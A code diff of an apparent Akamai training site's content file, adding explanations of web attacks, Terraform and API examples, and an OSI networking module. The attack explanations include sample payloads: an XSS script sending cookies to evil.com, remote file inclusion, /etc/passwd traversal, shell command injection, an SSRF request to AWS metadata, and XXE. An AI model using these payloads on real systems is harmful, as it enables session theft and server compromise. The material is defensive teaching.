@@ -343,11 +343,19 @@ $ echo | openssl s_client -connect www.example.com:443 2>/dev/null | \\
       ],
     },
     concepts: [
-      { title: "Attack Groups — What the WAF Actually Detects", content: "WAF rules are organized into attack groups, each targeting a specific OWASP category: SQL Injection (SQLi) — detects ' OR 1=1, UNION SELECT, --, comments. Works by looking for SQL syntax in user input fields, query parameters, and cookies. Cross-Site Scripting (XSS) — detects <script>, onerror=, javascript: URIs, event handlers. Looks for HTML/JS injection. Local File Inclusion (LFI) — detects ../../../etc/passwd path traversal. Remote File Inclusion (RFI) — detects http:// URLs in parameters where attackers try to include remote code. Command Injection — detects ; ls, | cat, backtick commands, $(command). Protocol Attack — detects HTTP request smuggling, header manipulation, malformed requests." },
-      { title: "Tuning — The Hardest Part of Running a WAF", content: "Here is the reality: you cannot just turn on a WAF and walk away. Every application has legitimate requests that look suspicious. A search box query like 'SELECT * FROM products WHERE price < 100' triggers SQLi rules — but it is a legitimate user search. This is a false positive. The tuning process: (1) Deploy ALL rules in Alert mode (log but allow). (2) Monitor logs for 1-2 weeks with normal traffic. (3) Identify false positives — legitimate requests being flagged. (4) Create exception rules: 'Disable SQLi rule #950001 for parameter search_query on path /search'. (5) Gradually switch attack groups to Deny mode, one at a time. (6) Keep monitoring — new false positives appear as your app changes. Akamai's Adaptive Security Engine helps by auto-suggesting exception rules." },
-      { title: "Rate Controls — Application-Layer DDoS Defense", content: "Rate controls defend against Layer 7 (application-layer) attacks — valid-looking HTTP requests at high volume. Unlike network DDoS (raw bandwidth), L7 attacks are harder because each request looks legitimate. How to configure: define a threshold (e.g., 10 requests/minute to /api/login per IP), define a time window, define the client identifier (IP, session cookie, or custom key), and define the action when exceeded (deny, slow down, challenge). Critical endpoints to rate-limit: login (credential stuffing), registration (fake accounts), search/API (scraping), checkout (inventory hoarding). Pro tip: use different identifiers for different endpoints — IP-based for login, session-based for API." },
-      { title: "Custom Rules — Application-Specific Logic", content: "Beyond standard OWASP rules, create custom rules for your specific needs: Geo-blocking: block traffic from countries where you do not do business. Admin protection: only allow /admin/* from specific IP ranges or VPN. Header requirements: reject requests without a valid API key header. Size limits: reject request bodies over 10MB. Regex patterns: match specific patterns unique to attacks on your app. Conditional logic: combine conditions with AND/OR (block if country=X AND path=/api AND method=POST AND rate>50/min)." },
-      { title: "WAF Modes — Alert vs. Deny vs. Custom", content: "Each rule can be set independently: Alert mode — the request is allowed through, but logged. Use during initial deployment and tuning. You see what WOULD have been blocked without breaking anything. Deny mode — the request is blocked with a 403 response. Optionally serve a custom error page. Custom action — redirect the client, serve alternate content, or respond with a specific status code. Best practice: run new rules in Alert for 2+ weeks before switching to Deny. Start with high-confidence groups (SQLi, Command Injection) in Deny and lower-confidence groups (Protocol Attack) in Alert." },
+      { title: "SQL Injection (SQLi) — The Classic Database Attack", content: "Simple example: A website has a login form. The backend code does: SELECT * FROM users WHERE username = 'INPUT' AND password = 'INPUT'. An attacker types in the username field: admin' OR 1=1 --. The query becomes: SELECT * FROM users WHERE username = 'admin' OR 1=1 --' AND password = ''. The OR 1=1 is always true, and -- comments out the rest. The attacker is now logged in as admin without knowing the password. That is SQL injection — injecting SQL commands through user input. The WAF detects patterns like ' OR 1=1, UNION SELECT, --, and SQL keywords in places they should not appear (form fields, query parameters, cookies, headers). Akamai's WAF has dedicated SQLi attack group rules with high/medium/low sensitivity. High sensitivity catches more attacks but may flag legitimate queries like search boxes that contain SQL-like syntax." },
+      { title: "Cross-Site Scripting (XSS) — Injecting Code Into Pages", content: "Simple example: A website has a comment box. You type: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>. If the site does not sanitize the input, this script gets saved and shown to every visitor. When someone views that comment, the script runs in THEIR browser, stealing their session cookie and sending it to the attacker. The attacker now has their login session. That is stored XSS. Reflected XSS works similarly but through URLs: http://example.com/search?q=<script>alert('hacked')</script>. The site reflects the search term into the page without sanitizing, and the script runs. DOM-based XSS manipulates the page's JavaScript directly. Akamai's WAF detects <script> tags, onerror= attributes, javascript: URIs, and event handlers in user input." },
+      { title: "Remote File Inclusion (RFI) — Loading Malicious Code From Outside", content: "Simple example: A website has a page like: example.com/page.php?file=about.php. The site code says 'include the file named about.php and show it.' If the site does not validate what 'file' is, an attacker changes it to: example.com/page.php?file=http://badguy.com/evil.php. Now the site downloads evil.php from the attacker's server and RUNS it like it is part of the website. That evil.php could: steal passwords or data, run commands on the server (remote code execution), install a backdoor, or take over the entire server. This is one of the most dangerous vulnerabilities because it gives the attacker full code execution on your server. Akamai's WAF detects HTTP/HTTPS URLs in parameters where only local file paths should appear." },
+      { title: "Local File Inclusion (LFI) — Reading Server Files", content: "Simple example: Same vulnerable page: example.com/page.php?file=about.php. Instead of a remote URL, the attacker uses path traversal: example.com/page.php?file=../../../../etc/passwd. The ../ sequences go up directory levels until reaching the root, then access /etc/passwd (the Unix user list). The attacker can read: /etc/passwd (user accounts), /etc/shadow (password hashes if readable), application config files (database credentials), environment files (.env with API keys), log files (containing session tokens). The difference from RFI: LFI reads files already ON the server. RFI loads files FROM an external server. Akamai's WAF detects ../ sequences, encoded variants (%2e%2e%2f), and known sensitive file paths in request parameters." },
+      { title: "Command Injection — Running Shell Commands on Your Server", content: "Simple example: A website has a network diagnostic tool: example.com/ping?host=google.com. The backend runs: ping google.com. An attacker types: google.com; cat /etc/passwd. The backend now runs: ping google.com; cat /etc/passwd — two commands. The semicolon separates them. The attacker sees the ping output AND the contents of /etc/passwd. Other injection characters: | (pipe), && (and), || (or), $(command) (subshell), backticks. Worst case: the attacker runs rm -rf / or installs a reverse shell. Akamai's WAF detects shell metacharacters (;, |, &&, ||), command names (cat, ls, wget, curl), and encoded variants in user input." },
+      { title: "Server-Side Request Forgery (SSRF) — Tricking the Server Into Making Requests", content: "Simple example: A website lets you fetch a URL preview: example.com/preview?url=http://news-site.com/article. The server fetches that URL and shows a preview. An attacker changes it to: example.com/preview?url=http://169.254.169.254/latest/meta-data/. That is the AWS metadata endpoint — only accessible from INSIDE the server. The server fetches it (because the server IS inside the network) and returns AWS credentials, API keys, and instance configuration to the attacker. SSRF lets attackers reach internal services (databases, admin panels, cloud metadata) that are not exposed to the internet — by using YOUR server as a proxy. The 2019 Capital One breach (100M records) was an SSRF attack against AWS metadata. Akamai's WAF detects internal IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x) and cloud metadata URLs in user input." },
+      { title: "XML External Entities (XXE) — Weaponizing XML Parsers", content: "Simple example: A website accepts XML uploads (SOAP APIs, document uploads, RSS feeds). An attacker sends: <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><data>&xxe;</data>. The XML parser sees the entity definition and replaces &xxe; with the CONTENTS of /etc/passwd from the server's filesystem. The attacker gets server files in the response. More dangerous variants can: make HTTP requests to internal servers (like SSRF), cause denial of service (billion laughs attack — exponential entity expansion), and exfiltrate data through out-of-band channels. Fix: disable external entity processing in your XML parser. Akamai's WAF detects DOCTYPE declarations with ENTITY definitions, SYSTEM/PUBLIC keywords, and known XXE patterns in XML request bodies." },
+      { title: "DoS vs DDoS — Understanding Denial of Service", content: "DoS (Denial of Service): ONE attacker sends a flood of traffic to overwhelm a target. Like one person calling your phone non-stop so nobody else can reach you. Easier to block — you just block that one IP address. DDoS (Distributed Denial of Service): THOUSANDS or MILLIONS of compromised devices (a 'botnet') all attack simultaneously from different IPs worldwide. Like 10,000 people all calling your phone at once. Much harder to block — you cannot just block one IP because there are millions. Types of DDoS: (1) Volumetric (Layer 3): overwhelm bandwidth with raw traffic. SYN floods, UDP amplification, DNS reflection. Measured in Gbps/Tbps. (2) Protocol (Layer 4): exploit protocol weaknesses. SYN floods exhaust server connection tables. (3) Application (Layer 7): send valid-looking HTTP requests that are expensive to process. Slowloris (keep connections open forever), HTTP floods (millions of GET requests to /search). The largest attacks exceed 1 Tbps — more bandwidth than most organizations have." },
+      { title: "How Akamai Prevents DDoS — Multi-Layer Defense", content: "Akamai defends against DDoS at every layer: Layer 3/4 (Network DDoS): Akamai's global network has 1.3+ Tbps of scrubbing capacity distributed across 4,000+ PoPs. When a volumetric attack hits, it is absorbed across the ENTIRE network — no single location takes the full force. Prolexic Routed: For the largest attacks, all your traffic is routed through Akamai's dedicated scrubbing centers via BGP. Malicious traffic is dropped; clean traffic is forwarded to your origin. This happens automatically when attack signatures are detected. Layer 7 (Application DDoS): App & API Protector uses rate controls to limit request frequency per IP/session. Bot Manager detects and blocks automated flood tools. The Adaptive Security Engine identifies abnormal request patterns in real-time. WAF rules catch malicious payloads embedded in flood traffic. Key insight: Akamai does NOT defend your origin directly. It defends by being IN FRONT of your origin. All traffic hits Akamai's edge first — so attacks are absorbed at the edge before they ever reach your infrastructure. Your origin server never sees the attack traffic." },
+      { title: "OWASP Top 10 — What Akamai WAF Covers", content: "The OWASP Top 10 is the industry-standard list of critical web application security risks. Akamai's App & API Protector (WAAP) provides protection for most of them: A01 Broken Access Control → WAF header checks, API auth enforcement, rate controls, bot prevention. A02 Cryptographic Failures → TLS enforcement (strong versions/ciphers), data-in-transit protection. A03 Injection (SQLi, NoSQL, OS Command, LDAP, XPath) → One of the strongest areas — dedicated attack group rules with adaptive tuning. A04 Insecure Design → Partial — virtual patching for known CVEs, threat intel updates. A05 Security Misconfiguration → Blocks risky behaviors like unrestricted uploads, exposed debug endpoints. A06 Vulnerable Components → Virtual patching for known CVEs in frameworks/libraries. A07 Authentication Failures → Rate limiting for brute-force, bot detection for credential stuffing. A08 Data Integrity Failures → Some detection and monitoring support. A09 Logging/Monitoring Failures → WAF event logging, SIEM integration, real-time alerting. A10 SSRF → Dedicated rules detecting internal IPs, cloud metadata URLs, and DNS rebinding patterns." },
+      { title: "Tuning — The Hardest Part of Running a WAF", content: "Here is the reality: you cannot just turn on a WAF and walk away. Every application has legitimate requests that look suspicious to WAF rules. A search box query like 'SELECT * FROM products WHERE price < 100' triggers SQLi rules — but it is a legitimate user search. This is a false positive. The tuning process: (1) Deploy ALL rules in Alert mode (log but allow). (2) Monitor logs for 1-2 weeks with normal traffic. (3) Identify false positives — legitimate requests being flagged. (4) Create exception rules: 'Disable SQLi rule #950001 for parameter search_query on path /search'. (5) Gradually switch attack groups to Deny mode, one at a time. (6) Keep monitoring — new false positives appear as your app changes. Akamai's Adaptive Security Engine (ASE) helps by auto-suggesting exception rules based on ML analysis of your traffic patterns." },
+      { title: "Rate Controls — Application-Layer DDoS Defense", content: "Rate controls defend against Layer 7 (application-layer) attacks — valid-looking HTTP requests at high volume. Unlike network DDoS (raw bandwidth), L7 attacks are harder because each request looks legitimate. How to configure: define a threshold (e.g., 10 requests/minute to /api/login per IP), a time window, a client identifier (IP, session cookie, or custom key), and an action when exceeded (deny, slow down, challenge). Critical endpoints to rate-limit: login (credential stuffing), registration (fake accounts), search/API (scraping), checkout (inventory hoarding). Pro tip: use different identifiers for different endpoints — IP-based for login, session-based for API." },
+      { title: "Custom Rules and WAF Modes", content: "Custom rules go beyond standard OWASP rules: Geo-blocking (block countries where you do not operate), admin protection (only allow /admin/* from VPN IPs), header requirements (reject without API key), size limits (reject bodies >10MB), and regex patterns. WAF modes: Alert mode — allowed but logged (use during tuning). Deny mode — blocked with 403 (production mode). Custom action — redirect, serve alternate content. Best practice: run new rules in Alert 2+ weeks before Deny. Start high-confidence groups (SQLi, Command Injection) in Deny and lower-confidence groups (Protocol Attack) in Alert." },
     ],
     comparisons: [
       {
@@ -420,16 +428,24 @@ $ echo | openssl s_client -connect www.example.com:443 2>/dev/null | \\
     glossary: [
       { title: "WAF & Security Terms", color: "accent", terms: [
         { term: "WAF", definition: "Web Application Firewall — inspects HTTP traffic for attacks at Layer 7" },
-        { term: "SQLi", definition: "SQL Injection — injecting SQL commands through user input" },
-        { term: "XSS", definition: "Cross-Site Scripting — injecting JavaScript into web pages" },
-        { term: "LFI / RFI", definition: "Local/Remote File Inclusion — unauthorized file access via path traversal" },
-        { term: "DDoS", definition: "Distributed Denial of Service — overwhelming a target with traffic" },
-        { term: "Layer 3/4 vs 7", definition: "Network-layer (raw floods) vs application-layer (valid HTTP requests)" },
+        { term: "WAAP", definition: "Web Application and API Protection — Akamai's unified WAF + Bot + DDoS product (App & API Protector)" },
+        { term: "SQLi", definition: "SQL Injection — injecting SQL commands through user input to manipulate database queries" },
+        { term: "XSS", definition: "Cross-Site Scripting — injecting JavaScript into web pages that runs in other users' browsers" },
+        { term: "RFI", definition: "Remote File Inclusion — tricking a server into loading and executing code from an attacker's server" },
+        { term: "LFI", definition: "Local File Inclusion — using path traversal (../../) to read files on the server" },
+        { term: "SSRF", definition: "Server-Side Request Forgery — tricking the server into making requests to internal services" },
+        { term: "XXE", definition: "XML External Entities — weaponizing XML parsers to read files or make internal requests" },
+        { term: "Command Injection", definition: "Injecting shell commands (;, |, &&) through user input to execute OS commands" },
+        { term: "DoS", definition: "Denial of Service — one attacker overwhelming a target with traffic" },
+        { term: "DDoS", definition: "Distributed DoS — thousands/millions of compromised devices attacking simultaneously" },
+        { term: "Botnet", definition: "Network of compromised devices (IoT, PCs) controlled by an attacker for DDoS" },
+        { term: "OWASP Top 10", definition: "Industry-standard list of the 10 most critical web application security risks" },
+        { term: "Layer 3/4 vs 7", definition: "Network-layer attacks (raw floods) vs application-layer (valid HTTP requests)" },
         { term: "Rate Control", definition: "Limiting request frequency per client to prevent brute-force and scraping" },
         { term: "False Positive", definition: "Legitimate request incorrectly blocked — the #1 WAF operational challenge" },
-        { term: "Tuning", definition: "Adding exception rules to reduce false positives for your specific app" },
-        { term: "AAP", definition: "App & API Protector — Akamai's combined WAF + Bot + DDoS product" },
-        { term: "ASE", definition: "Adaptive Security Engine — ML-powered auto-tuning" },
+        { term: "Virtual Patching", definition: "WAF rules that block exploitation of known CVEs before you patch your code" },
+        { term: "Prolexic", definition: "Akamai's dedicated DDoS scrubbing service with 3-7+ Tbps capacity" },
+        { term: "ASE", definition: "Adaptive Security Engine — ML-powered auto-tuning that reduces false positives" },
         { term: "IP Reputation", definition: "Threat score for an IP based on observed behavior across Akamai's network" },
       ]},
     ],
@@ -924,6 +940,161 @@ variable "network" {
     }
   }
 }` },
+      { title: "Terraform — DNS Zone Management", language: "hcl", code: `# Manage Edge DNS records as code
+# Changes are version-controlled and peer-reviewed
+
+resource "akamai_dns_zone" "example" {
+  zone     = "example.com"
+  type     = "PRIMARY"
+  contract = var.contract_id
+  group    = var.group_id
+}
+
+resource "akamai_dns_record" "www" {
+  zone       = akamai_dns_zone.example.zone
+  name       = "www.example.com"
+  recordtype = "CNAME"
+  ttl        = 300
+  target     = ["www.example.com.edgekey.net."]
+}
+
+resource "akamai_dns_record" "api" {
+  zone       = akamai_dns_zone.example.zone
+  name       = "api.example.com"
+  recordtype = "A"
+  ttl        = 60  # Short TTL for failover
+  target     = ["203.0.113.50", "203.0.113.51"]
+}
+
+resource "akamai_dns_record" "mx" {
+  zone       = akamai_dns_zone.example.zone
+  name       = "example.com"
+  recordtype = "MX"
+  ttl        = 3600
+  target     = ["10 mail1.example.com.", "20 mail2.example.com."]
+}
+
+# terraform plan shows:
+# + akamai_dns_record.www will be created
+#   + name       = "www.example.com"
+#   + recordtype = "CNAME"
+#   + target     = ["www.example.com.edgekey.net."]` },
+      { title: "Terraform — WAF Security Policy Update", language: "hcl", code: `# Update WAF attack group settings via Terraform
+# No clicking through Control Center — just code
+
+resource "akamai_appsec_attack_group" "sql_injection" {
+  config_id          = akamai_appsec_configuration.main.config_id
+  security_policy_id = akamai_appsec_security_policy.www.security_policy_id
+  attack_group       = "SQL"
+  attack_group_action = "deny"  # Block SQL injection attempts
+
+  condition_exception = jsonencode({
+    # Exception: allow SQL-like syntax in the search box
+    exception = {
+      specificHeaderCookieOrParamNameValue = [{
+        names    = ["q", "search_query"]
+        selector = "REQUEST_PARAMETERS"
+      }]
+    }
+  })
+}
+
+resource "akamai_appsec_attack_group" "xss" {
+  config_id          = akamai_appsec_configuration.main.config_id
+  security_policy_id = akamai_appsec_security_policy.www.security_policy_id
+  attack_group       = "XSS"
+  attack_group_action = "deny"
+}
+
+resource "akamai_appsec_rate_policy" "login" {
+  config_id   = akamai_appsec_configuration.main.config_id
+  rate_policy = jsonencode({
+    name                  = "Login Brute Force Protection"
+    description           = "Block IPs exceeding 10 requests/min to /login"
+    averageThreshold      = 10
+    burstThreshold        = 15
+    clientIdentifier      = "ip"
+    matchType             = "path"
+    path                  = { positiveMatch = true, values = ["/api/login", "/login"] }
+    requestType           = "ForwardResponse"
+    sameActionOnIpv6      = true
+    useXForwardForHeaders = false
+  })
+}` },
+      { title: "Akamai OPEN API — Purge Cache via curl", language: "bash", code: `# Akamai configurations can be managed via REST API
+# The Akamai OPEN APIs use EdgeGrid authentication
+
+# Example 1: Purge CDN cache for specific URLs
+# (When you deploy new content and need it live immediately)
+$ curl -X POST "https://akaa-xxx.purge.akamaiapis.net/ccu/v3/invalidate/url/production" \\
+  --header "Content-Type: application/json" \\
+  --data '{
+    "objects": [
+      "https://www.example.com/index.html",
+      "https://www.example.com/css/main.css",
+      "https://www.example.com/api/products"
+    ]
+  }'
+# Response: { "purgeId": "abc-123", "estimatedSeconds": 5 }
+
+# Example 2: Purge by CP Code (everything under a billing code)
+$ curl -X POST "https://akaa-xxx.purge.akamaiapis.net/ccu/v3/invalidate/cpcode/production" \\
+  --data '{ "objects": [12345] }'
+
+# Example 3: List all properties via API
+$ curl "https://akaa-xxx.luna.akamaiapis.net/papi/v1/properties?contractId=ctr_123&groupId=grp_456"
+
+# Example 4: Get current WAF security config
+$ curl "https://akaa-xxx.luna.akamaiapis.net/appsec/v1/configs/12345/versions/1/security-policies"
+
+# All API calls require EdgeGrid auth (not shown for brevity)
+# Use the Akamai CLI or SDKs (Python, Node.js, Go, Java) 
+# which handle EdgeGrid signing automatically:
+$ akamai purge invalidate --urls https://www.example.com/index.html
+$ akamai property retrieve --property www.example.com` },
+      { title: "Terraform — Certificate Enrollment (CPS)", language: "hcl", code: `# Manage TLS certificates as code
+# Akamai CPS handles issuance, validation, and auto-renewal
+
+resource "akamai_cps_dv_enrollment" "www" {
+  common_name = "www.example.com"
+  sans        = ["shop.example.com", "api.example.com"]
+
+  admin_contact {
+    first_name = "Platform"
+    last_name  = "Team"
+    email      = "platform@example.com"
+    phone      = "+1-555-0100"
+    organization = "Example Corp"
+  }
+
+  tech_contact {
+    first_name = "Platform"
+    last_name  = "Team"
+    email      = "platform@example.com"
+    phone      = "+1-555-0100"
+    organization = "Example Corp"
+  }
+
+  certificate_chain_type = "default"
+  csr {
+    organization = "Example Corp"
+    country_code = "US"
+    state        = "California"
+    city         = "San Francisco"
+  }
+
+  network_configuration {
+    geography = "core"      # Standard network
+    sni_only  = true        # SNI (no dedicated IP needed)
+  }
+
+  signature_algorithm = "SHA-256"
+  secure_network      = "ENHANCED_TLS"
+  acknowledge_pre_verification_warnings = true
+}
+
+# After apply: Akamai issues a DV challenge (DNS TXT record)
+# Validates domain ownership, issues cert, and auto-renews` },
     ],
     glossary: [
       { title: "IaC & CI/CD Terms", color: "accent", terms: [
@@ -1075,6 +1246,111 @@ variable "network" {
       "You need to understand the relationship between delivery, security, and compute offerings",
       "Architecture decisions require choosing between edge-based and origin-based solutions",
       "You are planning a migration from another CDN/cloud provider to Akamai",
+    ],
+  },
+
+  "akamai-networking": {
+    id: "akamai-networking",
+    hero: {
+      badge1: { label: "OSI", color: "accent" },
+      title: "Networking Fundamentals — The OSI Model",
+      subtitle: "7 Layers from Application to Physical",
+      description: "The OSI (Open Systems Interconnection) model is the universal framework for understanding how data moves across a network. Every technology Akamai provides — CDN, WAF, DDoS protection, TLS, DNS — operates at specific layers of this model. Understanding which layer does what is the key to understanding why different attacks require different defenses.",
+      highlights: [
+        { icon: "📱", label: "Layer 7: Application", detail: "HTTP, HTTPS — what your browser and apps use" },
+        { icon: "🔒", label: "Layer 6: Presentation", detail: "Encryption (TLS), compression, data formatting" },
+        { icon: "🔌", label: "Layer 4: Transport", detail: "TCP (reliable) and UDP (fast) — ports and delivery" },
+        { icon: "🌐", label: "Layer 3: Network", detail: "IP addresses and routing across the internet" },
+      ],
+      mentalModel: "Think of the OSI model as a vertical stack. At the top (Layer 7), you have your browser requesting a webpage — human-level stuff. Each layer below handles a different part of getting that request to the server and back. Layer 7 (Application) creates the request. Layer 6 (Presentation) encrypts it. Layer 5 (Session) manages the conversation. Layer 4 (Transport) breaks it into packets and ensures reliable delivery. Layer 3 (Network) routes it across the internet using IP addresses. Layer 2 (Data Link) handles the local hop (your device to your router). Layer 1 (Physical) sends raw electrical signals or light pulses over the wire. When Akamai says 'Layer 3/4 DDoS' vs 'Layer 7 DDoS', they mean attacks at different levels of this stack — and each requires fundamentally different defenses.",
+    },
+    architecture: {
+      sectionLabel: "The 7 Layers",
+      title: "The OSI Model — From Top to Bottom",
+      description: "Here is the complete model, from what you care about (the app you use) down to the raw hardware. Each layer has a specific job and talks only to the layers directly above and below it.",
+      pipeline: [
+        { label: "Layer 7: Application", description: "This is your browser, email program, Zoom, etc. It creates the actual message — like 'show me this webpage' or 'send this email.' This is where HTTP/HTTPS lives. Akamai's CDN (Ion), WAF, and Bot Manager all operate here. When you hear 'Layer 7 DDoS attack,' it means valid-looking HTTP requests flooding your application — the hardest kind to defend against because each request looks legitimate.", badge: "L7", badgeColor: "accent" },
+        { label: "Layer 6: Presentation", description: "The translator/formatter. Makes sure data looks right for the other computer. Handles encryption (TLS/SSL — making it secret), compression (making it smaller), and format conversion (so both sides understand the data). When your browser shows the padlock icon, that is Layer 6 at work — TLS encrypts your data here before it goes down the stack. Think of it as turning your readable message into a scrambled, compressed package.", badge: "L6", badgeColor: "muted" },
+        { label: "Layer 5: Session", description: "The conversation manager. Starts, keeps track of, and ends the 'chat' between applications. Like saying 'hello, let's talk,' checking you are still connected, and 'goodbye' when done. Not super visible in everyday use, but important for long sessions like video calls, database connections, and RPC. TLS handshakes establish sessions at this layer.", badge: "L5", badgeColor: "muted" },
+        { label: "Layer 4: Transport", description: "The reliable delivery person. Breaks big messages into smaller pieces (segments), makes sure they arrive in order, and resends anything lost. Two main protocols: TCP (careful and reliable, like registered mail — used for web, email, file transfer) and UDP (fast but no guarantees, like regular post — used for video streaming, gaming, DNS queries). Uses PORTS (like apartment numbers) so multiple apps on one computer don't mix up their data. Port 80 = HTTP, Port 443 = HTTPS, Port 53 = DNS. Akamai's DDoS protection at Layer 3/4 handles SYN floods (TCP) and UDP amplification attacks here.", badge: "L4", badgeColor: "accent" },
+        { label: "Layer 3: Network", description: "The router brain. Figures out the path across the entire internet. Uses IP addresses (like house addresses) to route packets from your device to the destination, even across countries. Routers live here. This is where the internet REALLY happens — every packet gets an IP header with source and destination addresses, and routers along the way read these addresses to forward the packet toward its destination. Akamai's Anycast DNS and Prolexic DDoS scrubbing operate at this layer.", badge: "L3", badgeColor: "accent" },
+        { label: "Layer 2: Data Link", description: "Local neighborhood delivery. Gets data from one device to the next one RIGHT NEXT to it — same Wi-Fi network or same Ethernet cable. Uses MAC addresses (a device's unique hardware fingerprint, like AA:BB:CC:DD:EE:FF). Switches live here — they are the smart plugs in office networks that know which MAC address is on which port. This layer also checks for errors on the local wire/Wi-Fi and handles frame formatting. You rarely configure this layer directly, but it is why your laptop can talk to your router.", badge: "L2", badgeColor: "muted" },
+        { label: "Layer 1: Physical", description: "The actual wires and signals. Just sends raw 0s and 1s — no smarts, pure electricity, light, or radio waves. Ethernet cables (Cat5e, Cat6), fiber optic cables (light pulses), Wi-Fi antennas (radio waves), and the physical connectors/plugs. When your internet goes down because a cable was unplugged or a fiber was cut, that is a Layer 1 problem. Akamai's 4,000+ PoPs are connected by physical fiber optic backbone networks at this layer.", badge: "L1", badgeColor: "muted" },
+      ],
+    },
+    concepts: [
+      { title: "Why Layers Matter for Security — Different Attacks, Different Defenses", content: "Layer 3/4 DDoS attacks (SYN floods, UDP amplification, ICMP floods) overwhelm the NETWORK — they do not care about your application at all. They just send so much raw traffic that your connection is saturated. Defense: absorb the traffic with massive capacity (Akamai Prolexic, 3-7+ Tbps) at the network layer. Layer 7 DDoS attacks send valid-looking HTTP requests — each one looks like a real user visiting your site. But there are millions of them, and they all hit expensive endpoints (search, login, checkout). Defense: rate limiting, bot detection, and WAF rules at the application layer (Akamai App & API Protector). You CANNOT defend against Layer 3 attacks with a Layer 7 WAF, and you CANNOT defend against Layer 7 attacks with just bandwidth. You need both." },
+      { title: "How Data Actually Travels — Encapsulation", content: "When you send a request, data travels DOWN the stack on your end and UP the stack on the server end. At each layer going down, a header is ADDED (encapsulation): Layer 7 creates the HTTP request → Layer 6 encrypts it (TLS) → Layer 4 adds TCP header (source port, dest port, sequence number) → Layer 3 adds IP header (source IP, dest IP) → Layer 2 adds MAC header (your device MAC, router MAC) → Layer 1 sends raw bits. On the receiving end, each layer strips its header and passes the remaining data UP. This is why a network packet has multiple nested headers — each one is from a different layer, and each one is read by the appropriate device (router reads Layer 3, switch reads Layer 2, your app reads Layer 7)." },
+      { title: "Where Akamai Operates in the Stack", content: "Layer 1-2: Akamai's physical infrastructure — 4,000+ PoPs connected via dedicated fiber backbone. You do not configure this. Layer 3: Anycast routing for Edge DNS and Prolexic DDoS scrubbing. BGP announces the same IP from hundreds of locations. Layer 4: TCP optimization (connection pooling between edge and origin), SYN flood protection, and transport-level rate limiting. Layer 6: TLS termination at the edge — the edge server handles encryption/decryption so your origin does not have to. Layer 7: Everything you interact with — CDN caching (Ion), WAF rules (App & API Protector), Bot Manager, EdgeWorkers, and Property Manager behaviors. Most Akamai configuration happens at Layer 7." },
+      { title: "TCP vs UDP — The Two Transport Protocols", content: "TCP (Transmission Control Protocol): Connection-oriented, reliable. Before sending data, TCP does a 3-way handshake (SYN → SYN-ACK → ACK) to establish a connection. It guarantees delivery (retransmits lost packets), preserves order, and provides flow control. Used for: HTTP/HTTPS (web), SMTP (email), FTP (files), SSH. The downside: reliability adds latency — the handshake alone costs 1 RTT. UDP (User Datagram Protocol): Connectionless, unreliable (on purpose). No handshake, no delivery guarantee, no ordering. Just 'fire and forget.' Used for: DNS queries (small, one-shot), video streaming (a dropped frame is better than a delayed one), online gaming, VoIP. Faster because there is no setup overhead. DNS uses UDP for queries (fast) but falls back to TCP for large responses (zone transfers, DNSSEC)." },
+      { title: "Ports — How One Computer Runs Many Services", content: "A single server has one IP address but runs many services (web server, email, database, SSH). Ports (Layer 4) are like apartment numbers in a building — they direct traffic to the right service. Well-known ports: 80 (HTTP), 443 (HTTPS), 53 (DNS), 22 (SSH), 25 (SMTP), 3306 (MySQL). When your browser connects to www.example.com:443, it is connecting to IP address X on PORT 443. Your browser also uses a random 'ephemeral' port on your side (e.g., 52391) so the server knows where to send the response back. This is why firewalls often block by port — closing port 22 disables SSH access, closing port 3306 prevents remote database connections." },
+    ],
+    comparisons: [
+      {
+        title: "Layer 3/4 vs Layer 7 — Two Different Worlds",
+        description: "These layers handle fundamentally different things. Attacks at each layer require different defenses.",
+        items: [
+          { icon: "🌐", label: "Layer 3/4 (Network/Transport)", description: "Raw packets and connections — no application awareness.", points: ["Deals with IP addresses, ports, and raw packet delivery", "Attacks: SYN floods, UDP amplification, ICMP floods, DNS reflection", "Defense: massive bandwidth capacity to absorb floods (Prolexic)", "No visibility into HTTP content — just sees packets and bytes", "Analogy: flooding someone's mailbox with millions of empty envelopes"] },
+          { icon: "📱", label: "Layer 7 (Application)", description: "HTTP requests — understands the application.", points: ["Deals with URLs, headers, cookies, request bodies, API calls", "Attacks: HTTP floods, slowloris, credential stuffing, scraping", "Defense: WAF rules, rate limiting, bot detection, behavioral analysis", "Can inspect content and make smart decisions about each request", "Analogy: millions of people walking into a store and asking complicated questions"] },
+        ],
+      },
+    ],
+    codeExamples: [
+      { title: "See the Layers in Action — tcpdump and Wireshark", language: "bash", code: `# Capture packets and see the layer headers in real-time
+# tcpdump shows you Layer 3 (IP) and Layer 4 (TCP/UDP) headers
+
+# Capture DNS queries (Layer 7 over UDP Layer 4)
+$ sudo tcpdump -n port 53
+14:30:01 IP 192.168.1.100.52391 > 8.8.8.8.53: 
+  12345+ A? www.example.com. (33)
+# ↑ Your IP:ephemeral_port → Google DNS:port 53
+# ↑ Asking for A record for www.example.com
+
+# Capture HTTPS connections (see the TCP handshake)
+$ sudo tcpdump -n port 443 -c 10
+14:30:02 IP 192.168.1.100.52392 > 93.184.216.34.443: 
+  Flags [S], seq 123456       # SYN (Step 1 of TCP handshake)
+14:30:02 IP 93.184.216.34.443 > 192.168.1.100.52392: 
+  Flags [S.], seq 789012      # SYN-ACK (Step 2)
+14:30:02 IP 192.168.1.100.52392 > 93.184.216.34.443: 
+  Flags [.], ack 789013       # ACK (Step 3 — TCP connected!)
+# After this: TLS handshake (Layer 6), then HTTP (Layer 7)
+
+# Check which ports are open on your server (Layer 4)
+$ netstat -tlnp
+Active Internet connections (only servers)
+Proto  Local Address      State    PID/Program
+tcp    0.0.0.0:80         LISTEN   nginx
+tcp    0.0.0.0:443        LISTEN   nginx
+tcp    0.0.0.0:22         LISTEN   sshd
+tcp    0.0.0.0:3306       LISTEN   mysqld` },
+    ],
+    glossary: [
+      { title: "Networking Terms", color: "accent", terms: [
+        { term: "OSI Model", definition: "7-layer reference model for understanding network communication" },
+        { term: "TCP", definition: "Transmission Control Protocol — reliable, ordered delivery with handshake (Layer 4)" },
+        { term: "UDP", definition: "User Datagram Protocol — fast, connectionless, no delivery guarantee (Layer 4)" },
+        { term: "IP Address", definition: "Layer 3 address identifying a device on the network (IPv4: 192.168.1.1, IPv6: 2001:db8::1)" },
+        { term: "MAC Address", definition: "Layer 2 hardware address unique to each network interface (AA:BB:CC:DD:EE:FF)" },
